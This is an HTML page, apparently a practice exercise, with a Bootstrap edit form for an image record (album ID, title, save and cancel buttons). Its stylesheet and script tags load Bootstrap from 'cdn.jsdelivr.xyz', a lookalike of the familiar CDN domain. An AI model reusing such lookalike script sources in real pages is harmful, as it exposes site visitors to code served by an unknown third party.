<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      href="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-4bw+/aepP/YC94hEpVNVgiZdgIC5+VKNBQNGCHeKRQN+PtmoHDEXuppvnDJzQIu9"
      crossorigin="anonymous"
    />
    <title>image ID</title>
  </head>
  <body>
    <!-- ******Form****** -->
    <!-- #region -->
    <form
      class="row g-3 w-25 mt-5 m-auto card p-3 bg-light"
      action="Index.html"
      method="post"
      id="form"
    >
      <!-- ****IMG***** -->
      <div>
        <img id="img" src="" alt="" />
      </div>
      <!-- ****ID***** -->
      <p id="id"></p>
      <!-- ****Album_ID***** -->
      <div class="col-md-6 me-5 d-block">
        <label for="albumId" class="form-label">Album ID</label>
        <input type="text" value="" class="form-control" id="albumId" />
      </div>
      <!-- *****Title***** -->
      <div class="col-md-12 d-block">
        <label for="title" class="form-label">Title</label>
        <input type="text" value="" class="form-control mb-4" id="title" />
      </div>
      <!-- *****Save BTN***** -->
      <div id="saveBtn" class="col-12 d-block">
        <a href=""
          ><button type="submit" class="btn btn-primary">Save</button></a
        >
      </div>
      <!-- *****Cancel BTN***** -->
      <div id="cancelBtn" class="col-12 d-block">
        <a href="Index.html" class="btn btn-primary">cancel</a>
      </div>
    </form>
    <!-- #endregion -->

    <!-- *****Javascript***** -->
    <script src="editjs.js"></script>
    <script
      src="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-HwwvtgBNo3bZJJLYd8oVXjrBZt8cqVSpeBNS5n7C8IVInixGAoxmnlMuBnhbgrkm"
      crossorigin="anonymous"
    ></script>
  </body>
</html>
